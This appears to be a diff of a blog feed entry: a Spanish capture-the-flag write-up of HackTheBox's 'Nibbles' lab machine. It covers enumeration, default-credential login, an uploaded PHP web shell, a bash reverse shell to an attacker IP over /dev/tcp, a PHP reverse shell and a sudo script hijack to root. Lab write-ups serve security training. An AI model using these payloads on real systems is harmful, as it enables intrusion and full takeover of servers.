-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://10.10.10.75/
-&amp;lt;b&amp;gt;Hello world!&amp;lt;/b&amp;gt;
-
-
-
-&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; /nibbleblog/ directory. Nothing interesting here! &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/nibbles/03-page.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Poco podemos utilizar de la información obtenida, así que vamos a realizar fuzzing por medio de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirsearch&lt;/code&gt;, esta vez para encontrar rutas con posible contenido que pueda ser útil.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dirsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; 404,403,301 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.75/nibbleblog/
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;00:06:59] 200 -    1KB - /nibbleblog/admin.php
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;00:06:59] 200 -    2KB - /nibbleblog/admin/
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;00:07:29] 200 -    1KB - /nibbleblog/content/
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;00:07:52] 200 -    3KB - /nibbleblog/languages/
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;00:08:09] 200 -    4KB - /nibbleblog/plugins/
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;00:08:23] 200 -    2KB - /nibbleblog/themes/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al revisar los directorios, podemos identificar un potencial usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;, el cual puede ser de utilidad en el momento de acceder con credenciales a un portal.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/nibbles/04-page2.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;También logramos detectar la versión de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nibbleblog&lt;/code&gt; almacenado en un screenshot en lo recursos de la máquina.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/nibbles/05-page3.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Realizamos la búsqueda de posibles exploits públicos existentes para la versión 4 de nibbleblog, obteniendo éxito en sus resultados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit nibble 4
-&lt;span class=&quot;nt&quot;&gt;---------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
- Exploit Title                               |  Path
-&lt;span class=&quot;nt&quot;&gt;---------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-Nibbleblog 4.0.3 - Arbitrary File Upload &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Me | php/remote/38489.rb
-&lt;span class=&quot;nt&quot;&gt;---------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Luego de entender un poco más el script, su función se basa en el plugin &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;my_image&lt;/code&gt; que permite la subida de archivos, sin embargo, requerimos de un acceso al portal, por lo que accedemos a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.75/nibbleblog/admin.php&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/nibbles/06-page4.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;En el login se realizaron pruebas de fuerza bruta, pero esto ocasionó un bloqueo por la cantidad de intentos realizados, así que en esta máquina recomiendo que intenten realizar intentos manuales con credenciales por defecto o asociadas a la máquina.&lt;/p&gt;
-
-&lt;p&gt;Las credenciales de acceso son &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;:&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nibbles&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;NOTA: El usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; lo obtuvimos de la enumeración web&lt;/em&gt;&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;  
-&lt;img src=&quot;/assets/images/nibbles/07-page5.png&quot; /&gt;      
-&lt;/p&gt;
-
-&lt;p&gt;Ahora que tenemos acceso a las opciones del servidor, vamos a acceder a la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plugins&lt;/code&gt; y configuramos el plugin &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;My image&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;  
-&lt;img src=&quot;/assets/images/nibbles/08-page6.png&quot; /&gt;      
-&lt;/p&gt;
-
-&lt;p&gt;Vamos a proceder con la intrusión intentando subir una serie de archivos que permitan obtener una shell reversa e interactiva en nuestra máquina, para esto accedemos a nuestra carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../exploit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;intrusion-webshell-php--reverse-shell-bash&quot;&gt;INTRUSION WEBSHELL PHP + REVERSE SHELL BASH&lt;/h2&gt;
-
-&lt;p&gt;Creamos un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webshell.php&lt;/code&gt; y generamos un código para lograr una shell a nivel web en el servidor afectado.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim webshell.php
-&amp;lt;?php
-        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; shell_exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Subimos el archivo en el plugin &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;My image&lt;/code&gt; y hacemos una prueba ejecutando un comando de reconocimiento.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p align=&quot;center&quot;&gt;  
-&lt;img src=&quot;/assets/images/nibbles/09-page7.png&quot; /&gt;        
-&lt;/p&gt;
-
-&lt;p&gt;Obteniendo una prueba exitosa, procedemos a activar un listener.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Generamos una reverse shell en bash con la siguiente petición web.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;%26 /dev/tcp/10.10.14.6/4564 0&amp;gt;%261&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/nibbles/10-page8.png&quot; /&gt; 
-&lt;/p&gt;
-
-&lt;h2 id=&quot;intrusion-reverse-shell-php&quot;&gt;INTRUSION REVERSE SHELL PHP&lt;/h2&gt;
-
-&lt;p&gt;Otra manera de realizar una intrusión es directamente con una reverse shell en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt;, para esto vamos a localizar y copiar una reverse shell en los recursos de nuestra máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;locate php-reverse-shell
-&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/webshells/php/php-reverse-shell.php &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Procedemos a modificar la reverse shell con nuestra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IP&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puerto&lt;/code&gt; que vamos a utilizar para generar la conexión con nuestra máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim php-reverse-shell.php
-&lt;span class=&quot;c&quot;&gt;#MODIFICAR LINEAS 49 Y 50&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'10.10.14.6'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  // CHANGE THIS         
-&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 4564&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       // CHANGE THIS
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Subimos el archivo en el plugin &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;My image&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Procedemos a activar un listener.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Consultamos el recurso en la siguiente URL.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/nibbles/11-page9.png&quot; /&gt; 
-&lt;/p&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ESCALADA DE PRIVILEGIOS&lt;/h2&gt;
-
-&lt;p&gt;Una vez que tenemos acceso a la máquina, realizamos el escalamiento de privilegios, en este caso, revisando los permisos a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nibbler@Nibbles:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;nibbler on Nibbles:
-    env_reset, mail_badpass,
-    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
-
-User nibbler may run the following commands on Nibbles:
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Se identifica que es posible ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/nibbler/personal/stuff/monitor.sh&lt;/code&gt; con privilegios, así que vamos a ir a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/nibbler&lt;/code&gt; y creamos las carpetas &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;personal&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stuff&lt;/code&gt;, debido a que no existen actualmente.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/nibbler/
-&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; personal/stuff
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ingresamos a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/nibbler/personal/stuff&lt;/code&gt; y creamos el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;monitor.sh&lt;/code&gt; con el siguiente contenido.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nano monitor.sh
-&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-bash
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Asignamos permisos de ejecución.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x monitor.sh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos el comando y finalmente obtenemos acceso al sistema con un usuario privilegiado.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /home/nibbler/personal/stuff/monitor.sh
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;root
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;flags&quot;&gt;FLAGS&lt;/h2&gt;
-
-&lt;p&gt;Una vez tenemos acceso a la máquina, tenemos la posibilidad de leer la flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#USER&lt;/span&gt;
-find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; user.txt 2&amp;gt;/dev/null | xargs &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
-&lt;/span&gt;eb6f5526f2
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#ROOT&lt;/span&gt;
-find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; root.txt 2&amp;gt;/dev/null | xargs &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
-&lt;/span&gt;8ea802495e
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nibbles&lt;/code&gt; de HackTheBox!&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/nibbles/12-finish.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;.&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Nibbles" /><summary type="html">Vamos a resolver la maquina Nibbles de HackTheBox. ¡Let's hack!</summary></entry></feed>
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Optimum" /><summary type="html">Vamos a resolver la máquina Optimum de HackTheBox. ¡Let's hack!</summary></entry></feed>
